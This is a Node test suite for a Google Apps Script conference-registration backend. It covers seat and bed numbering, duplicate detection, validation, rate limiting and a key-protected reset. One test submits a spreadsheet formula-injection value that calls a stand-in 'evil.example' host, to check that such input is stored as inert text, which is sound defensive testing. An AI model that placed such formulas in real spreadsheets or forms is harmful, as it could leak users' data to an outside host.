// Tests for backend/Code.gs, run in Node against small in-memory stand-ins for the
// Google Apps Script services it uses (Sheets, properties, lock, cache).
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import vm from "node:vm";

const SOURCE = readFileSync(new URL("../backend/Code.gs", import.meta.url), "utf8");

function fakeSheet(name) {
  const rows = [];
  return {
    rows,
    _name: name,
    getName() { return this._name; },
    setName(n) { this._name = n; },
    setFrozenRows() {},
    appendRow(r) { rows.push(Array.from(r)); },
    getLastRow() { return rows.length; },
    getLastColumn() { return rows.reduce((m, r) => Math.max(m, r.length), 0); },
    getRange(row, col, nr, nc) {
      return {
        getValues: () => Array.from({ length: nr }, (_, i) => Array.from({ length: nc }, (_, j) => {
          const v = (rows[row - 1 + i] || [])[col - 1 + j];
          return v === undefined ? "" : v;
        })),
        setValues: (vals) => vals.forEach((r, i) => r.forEach((v, j) => {
          const target = rows[row - 1 + i] || (rows[row - 1 + i] = []);
          target[col - 1 + j] = v;
        }))
      };
    }
  };
}

function load(props = {}) {
  const store = Object.assign({}, props);
  const cache = {};
  const sheets = [];
  let lockHeld = false;
  const ctx = {
    console,
    Date,
    PropertiesService: { getScriptProperties: () => ({
      getProperty: k => (k in store ? store[k] : null),
      setProperty: (k, v) => { store[k] = String(v); }
    }) },
    LockService: { getScriptLock: () => ({
      waitLock: () => { assert.equal(lockHeld, false, "lock is not re-entrant"); lockHeld = true; },
      releaseLock: () => { lockHeld = false; }
    }) },
    CacheService: { getScriptCache: () => ({ get: k => cache[k] ?? null, put: (k, v) => { cache[k] = v; } }) },
    SpreadsheetApp: { getActiveSpreadsheet: () => ({
      getSheetByName: n => sheets.find(s => s.getName() === n) || null,
      insertSheet: n => { const s = fakeSheet(n); sheets.push(s); return s; }
    }) },
    ContentService: { MimeType: { JSON: "json" }, createTextOutput: s => ({ setMimeType: () => JSON.parse(s) }) },
    Utilities: { formatDate: () => "2027-01-01 10:00" },
    Session: { getScriptTimeZone: () => "Africa/Lagos" }
  };
  vm.createContext(ctx);
  vm.runInContext(SOURCE, ctx);
  const post = body => ctx.doPost({ postData: { contents: JSON.stringify(body) } });
  const get = p => ctx.doGet({ parameter: { p } });
  return { ctx, post, get, store, sheets, cache };
}

const person = (email, extra = {}) => Object.assign({ name: "Ada Obi", email, phone: "+2348011111111", location: "Lagos", heardAbout: "WhatsApp" }, extra);

test("registration issues seat and bed numbers in order", () => {
  const b = load();
  const r1 = b.post({ action: "register", person: person("ada@example.com"), days: 3, hostel: true });
  const r2 = b.post({ action: "register", person: person("ben@example.com"), days: 2, hostel: false });
  const r3 = b.post({ action: "register", person: person("chi@example.com"), days: 1, hostel: true });
  assert.deepEqual([r1.seq, r1.bed], [1, 1]);
  assert.deepEqual([r2.seq, r2.bed], [2, null]);
  assert.deepEqual([r3.seq, r3.bed], [3, 2]);
  const reg = b.sheets.find(s => s.getName() === "Registrations");
  assert.equal(reg.rows.length, 4); // header + 3
  assert.equal(reg.rows[1][1], "STS-MC27-001");
  assert.equal(reg.rows[1][3], 11, "seat numbers start at 11");
  assert.equal(b.get("/mc-seat").count, 3);
});

test("the same email gets its original numbers back, case-insensitively", () => {
  const b = load();
  const first = b.post({ action: "register", person: person("ada@example.com"), days: 2, hostel: true });
  const again = b.post({ action: "register", person: person("ADA@Example.com"), days: 3, hostel: false });
  assert.equal(again.existing, true);
  assert.equal(again.seq, first.seq);
  assert.equal(again.bed, first.bed);
  assert.equal(again.days, 2);
  assert.equal(again.hostel, true);
  assert.equal(b.get("/mc-seat").count, 1, "no extra seat was used");
});

test("a full conference refuses new registrations without using a bed", () => {
  const b = load({ CONF_MAX: "2" });
  b.post({ action: "register", person: person("a@example.com"), hostel: true });
  b.post({ action: "register", person: person("b@example.com"), hostel: true });
  const r = b.post({ action: "register", person: person("c@example.com"), hostel: true });
  assert.deepEqual(r, { full: true });
  assert.equal(b.get("/mc-bed").count, 2);
});

test("invalid registrations are rejected", () => {
  const b = load();
  assert.equal(b.post({ action: "register", person: person("not-an-email") }).error, "invalid");
  assert.equal(b.post({ action: "register", person: { email: "x@example.com" } }).error, "invalid");
  assert.equal(b.get("/mc-seat").count, 0);
});

test("days are clamped to the length of the conference", () => {
  const b = load();
  assert.equal(b.post({ action: "register", person: person("a@example.com"), days: 99 }).days, 3);
  assert.equal(b.post({ action: "register", person: person("b@example.com"), days: -4 }).days, 1);
});

test("spreadsheet formulas typed into a form are stored as plain text", () => {
  const b = load();
  b.post({ action: "register", person: person("a@example.com", { location: '=IMPORTXML("http://evil.example","//a")' }) });
  const row = b.sheets.find(s => s.getName() === "Registrations").rows[1];
  assert.equal(row[8], "'=IMPORTXML(\"http://evil.example\",\"//a\")");
  assert.equal(row[7], "'+2348011111111", "phone numbers stay text");
});

test("seat and bed counters cannot be moved from outside", () => {
  const b = load();
  assert.equal(b.get("/mc-seat/up").error, "forbidden");
  assert.equal(b.get("/mc-bed/up").error, "forbidden");
  assert.equal(b.get("/whatever").error, "unknown counter");
  assert.equal(b.get("/april-join/up").count, 1);
  assert.equal(b.get("/april-join").count, 1);
});

test("reset needs the RESET_KEY and archives test registrations", () => {
  const b = load({ RESET_KEY: "correct horse battery staple" });
  b.post({ action: "register", person: person("a@example.com"), hostel: true });
  assert.equal(b.post({ action: "reset", key: "guess" }).error, "forbidden");
  assert.equal(b.get("/mc-seat").count, 1);
  assert.equal(b.post({ action: "reset", key: "correct horse battery staple" }).ok, true);
  assert.equal(b.get("/mc-seat").count, 0);
  assert.equal(b.get("/mc-bed").count, 0);
  assert.match(b.sheets[0].getName(), /^Registrations \(archived /);
  // The same email can register again after a reset, and numbering restarts.
  const r = b.post({ action: "register", person: person("a@example.com") });
  assert.equal(r.existing, undefined);
  assert.equal(r.seq, 1);
});

test("reset is refused while no RESET_KEY is configured", () => {
  const b = load();
  assert.match(b.post({ action: "reset", key: "" }).error, /RESET_KEY/);
});

test("form logs go to the right tab and new fields add columns", () => {
  const b = load();
  b.post({ action: "log", type: "Giving (Bibles)", data: { name: "Ada", amount: "$10" } });
  b.post({ action: "log", type: "Giving (Tracts)", data: { name: "Ben", note: "for 5 Bibles" } });
  b.post({ action: "log", type: "Prayer Request (Healing)", data: { name: "Chi" } });
  const giving = b.sheets.find(s => s.getName() === "Giving");
  assert.deepEqual(giving.rows[0], ["Received", "Type", "name", "amount", "note"]);
  assert.equal(giving.rows[2][2], "Ben");
  assert.equal(giving.rows[2][4], "for 5 Bibles");
  assert.ok(b.sheets.find(s => s.getName() === "Prayer"));
});

test("too many requests in one minute are turned away", () => {
  const b = load();
  let last;
  for (let i = 0; i < 125; i++) last = b.post({ action: "log", type: "Prayer", data: { n: i } });
  assert.equal(last.error, "busy");
});

test("malformed requests get an error, not a crash", () => {
  const b = load();
  assert.equal(b.ctx.doPost({ postData: { contents: "not json" } }).error, "bad request");
  assert.equal(b.post({ action: "drop tables" }).error, "unknown action");
});
